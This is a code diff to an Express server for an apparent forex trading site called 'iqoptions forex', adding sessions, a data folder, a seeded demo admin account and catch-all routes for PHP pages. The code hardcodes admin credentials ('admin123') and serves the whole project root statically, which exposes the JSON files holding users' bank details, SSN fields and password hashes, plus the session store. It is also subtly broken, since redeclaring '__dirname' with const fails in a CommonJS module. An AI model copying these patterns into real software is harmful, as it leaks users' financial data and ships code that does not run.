@@ -9,23 +9,39 @@ const fs = require('fs');
 const app = express();
 const PORT = process.env.PORT || 7860;
 
+// Get the correct directory path for Hugging Face
+const __dirname = path.resolve();
+
 // Middleware (HuggingFace compatible)
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
-app.use(express.static(".")); // Serve everything from root directory
+app.use(express.static(__dirname)); // Serve everything from root directory
 
-// Session middleware
+// Session middleware with file storage for production
+const FileStore = require('session-file-store')(session);
 app.use(session({
-    secret: process.env.SESSION_SECRET || 'huggingface-space-secret-key',
+    secret: process.env.SESSION_SECRET || 'huggingface-space-secret-key-' + crypto.randomBytes(32).toString('hex'),
     resave: false,
-    saveUninitialized: true,
-    cookie: { secure: false }
+    saveUninitialized: false,
+    store: new FileStore({
+        path: path.join(__dirname, 'sessions')
+    }),
+    cookie: { 
+        secure: false,
+        maxAge: 24 * 60 * 60 * 1000 // 24 hours
+    }
 }));
 
-// JSON file for persistent user storage (instead of MySQL)
-const usersFile = path.join(__dirname, 'users.json');
-const tradesFile = path.join(__dirname, 'trades.json');
-const withdrawalsFile = path.join(__dirname, 'withdrawals.json');
+// JSON file for persistent user storage
+const dataDir = path.join(__dirname, 'data');
+const usersFile = path.join(dataDir, 'users.json');
+const tradesFile = path.join(dataDir, 'trades.json');
+const withdrawalsFile = path.join(dataDir, 'withdrawals.json');
+
+// Ensure data directory exists
+if (!fs.existsSync(dataDir)) {
+    fs.mkdirSync(dataDir, { recursive: true });
+}
 
 // Load data from JSON files
 function loadUsers() {
@@ -97,6 +113,33 @@ let users = loadUsers();
 let trades = loadTrades();
 let withdrawals = loadWithdrawals();
 
+// Add demo admin user if no users exist
+if (users.length === 0) {
+    const demoUser = {
+        id: 1,
+        account_id: 'ADMIN01',
+        name: 'Demo User',
+        email: 'demo@iqoptionsforex.com',
+        phone: '+1234567890',
+        plan: 'Gold Package',
+        country: 'United States',
+        bank: 'Demo Bank',
+        account_name: 'Demo User',
+        account_number: '123456789',
+        ssn: '',
+        pobox: '',
+        token: 'demo-token',
+        status: 1,
+        date: new Date().toLocaleString(),
+        password: '$2a$10$8K1p/a0dRTlR0dS1.2TkOuB6QnQzJf8VY9qXkZJ7nQrJvL5YfH6W', // password: demo123
+        balance: '5000.00',
+        profit: '1250.00'
+    };
+    users.push(demoUser);
+    saveUsers();
+    console.log('✅ Created demo user');
+}
+
 // Utility function to generate random IDs
 function generateId(length = 6) {
     return crypto.randomBytes(Math.ceil(length / 2)).toString('hex').slice(0, length).toUpperCase();
@@ -107,69 +150,90 @@ function generateTransactionId() {
     return 'TRX' + Date.now().toString().slice(-9) + Math.random().toString(36).substr(2, 3).toUpperCase();
 }
 
+// Safe file sending function
+function safeSendFile(res, filePath, fallbackPath = null) {
+    const fullPath = path.join(__dirname, filePath);
+    
+    if (fs.existsSync(fullPath)) {
+        res.sendFile(fullPath);
+    } else if (fallbackPath && fs.existsSync(path.join(__dirname, fallbackPath))) {
+        res.sendFile(path.join(__dirname, fallbackPath));
+    } else {
+        res.status(404).send(`
+            <html>
+                <body style="font-family: Arial, sans-serif; text-align: center; padding: 50px;">
+                    <h2>Page Not Found</h2>
+                    <p>The requested page could not be found.</p>
+                    <p><a href="/">Return to Homepage</a></p>
+                </body>
+            </html>
+        `);
+    }
+}
+
 // Routes
 
 // Serve main pages
 app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'index.html'));
+    safeSendFile(res, 'index.html', 'index.php');
 });
 
 app.get('/about.php', (req, res) => {
-    res.sendFile(path.join(__dirname, 'about.php'));
+    safeSendFile(res, 'about.php');
 });
 
 app.get('/packages.php', (req, res) => {
-    res.sendFile(path.join(__dirname, 'packages.php'));
+    safeSendFile(res, 'packages.php');
 });
 
 app.get('/terms.php', (req, res) => {
-    res.sendFile(path.join(__dirname, 'terms.php'));
+    safeSendFile(res, 'terms.php');
 });
 
 app.get('/successful_reg.php', (req, res) => {
-    res.sendFile(path.join(__dirname, 'successful_reg.php'));
+    safeSendFile(res, 'successful_reg.php');
 });
 
 app.get('/success_recovery.php', (req, res) => {
-    res.sendFile(path.join(__dirname, 'success_recovery.php'));
+    safeSendFile(res, 'success_recovery.php');
 });
 
 // Auth pages
 app.get('/access/login.php', (req, res) => {
-    res.sendFile(path.join(__dirname, 'access/login.html'));
+    safeSendFile(res, 'access/login.php', 'access/login.html');
 });
 
 app.get('/access/register.php', (req, res) => {
-    res.sendFile(path.join(__dirname, 'access/register.html'));
+    safeSendFile(res, 'access/register.php', 'access/register.html');
 });
 
 app.get('/access/forget_password.php', (req, res) => {
-    res.sendFile(path.join(__dirname, 'access/forget_password.html'));
+    safeSendFile(res, 'access/forget_password.php', 'access/forget_password.html');
 });
 
 app.get('/access/adminlogin.php', (req, res) => {
-    res.sendFile(path.join(__dirname, 'access/adminlogin.html'));
+    safeSendFile(res, 'access/adminlogin.php', 'access/adminlogin.html');
 });
 
 // Dashboard pages
 app.get('/dashboard/home.php', requireAuth, (req, res) => {
-    res.sendFile(path.join(__dirname, 'dashboard/home.html'));
+    safeSendFile(res, 'dashboard/home.php', 'dashboard/home.html');
 });
 
 app.get('/dashboard/profile.php', requireAuth, (req, res) => {
-    res.sendFile(path.join(__dirname, 'dashboard/profile.html'));
+    safeSendFile(res, 'dashboard/profile.php', 'dashboard/profile.html');
 });
 
 app.get('/dashboard/wallet.php', requireAuth, (req, res) => {
-    res.sendFile(path.join(__dirname, 'dashboard/wallet.html'));
+    safeSendFile(res, 'dashboard/wallet.php', 'dashboard/wallet.html');
 });
 
 app.get('/dashboard/transactions.php', requireAuth, (req, res) => {
-    res.sendFile(path.join(__dirname, 'dashboard/transactions.html'));
+    safeSendFile(res, 'dashboard/transactions.php', 'dashboard/transactions.html');
 });
 
 app.get('/dashboard/admin_dashboard.php', requireAdminAuth, (req, res) => {
-    res.sendFile(path.join(__dirname, 'dashboard/admin_dashboard.html'));
+    safeSendFile(res, 'dashboard/admin_dashboard.php', 'dashboard/admin_dashboard.html');
 });
 
 // API Routes
@@ -182,7 +246,8 @@ app.get("/api/health", (req, res) => {
         usersCount: users.length,
         tradesCount: trades.length,
         withdrawalsCount: withdrawals.length,
-        storage: "json-file"
+        storage: "json-file",
+        environment: "huggingface"
     });
 });
 
@@ -231,8 +296,8 @@ app.post('/controller/registration.php', async (req, res) => {
             status: 1, // Auto-verify for demo
             date: new Date().toLocaleString(),
             password: hashedPassword,
-            balance: 0,
-            profit: 0
+            balance: '0.00',
+            profit: '0.00'
         };
         
         users.push(newUser);
@@ -290,7 +355,7 @@ app.post('/access/adminlogin.php', async (req, res) => {
     try {
         const { email, password } = req.body;
         
-        // Default admin credentials (change in production)
+        // Demo admin credentials
         const adminEmail = 'admin@iqoptionsforex.com';
         const adminPassword = 'admin123';
         
@@ -487,6 +552,24 @@ function requireAdminAuth(req, res, next) {
     }
 }
 
+// Serve any PHP file as static (fallback)
+app.get('*.php', (req, res) => {
+    const filePath = path.join(__dirname, req.path);
+    if (fs.existsSync(filePath)) {
+        res.sendFile(filePath);
+    } else {
+        res.status(404).send(`
+            <html>
+                <body style="font-family: Arial, sans-serif; text-align: center; padding: 50px;">
+                    <h2>Page Not Found</h2>
+                    <p>The requested page could not be found.</p>
+                    <p><a href="/">Return to Homepage</a></p>
+                </body>
+            </html>
+        `);
+    }
+});
+
 // 404 handler for API routes
 app.use('/api/*', (req, res) => {
     res.status(404).json({
@@ -495,9 +578,24 @@ app.use('/api/*', (req, res) => {
     });
 });
 
+// Global error handler
+app.use((err, req, res, next) => {
+    console.error('Server error:', err);
+    res.status(500).send(`
+        <html>
+            <body style="font-family: Arial, sans-serif; text-align: center; padding: 50px;">
+                <h2>Server Error</h2>
+                <p>Something went wrong. Please try again later.</p>
+                <p><a href="/">Return to Homepage</a></p>
+            </body>
+        </html>
+    `);
+});
+
 // Start server (HuggingFace compatible)
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 iqoptions forex Server running on port ${PORT}`);
+    console.log(`📁 Working directory: ${__dirname}`);
     console.log(`📊 Loaded ${users.length} users from storage`);
     console.log(`📈 Loaded ${trades.length} trades from storage`);
     console.log(`💰 Loaded ${withdrawals.length} withdrawals from storage`);
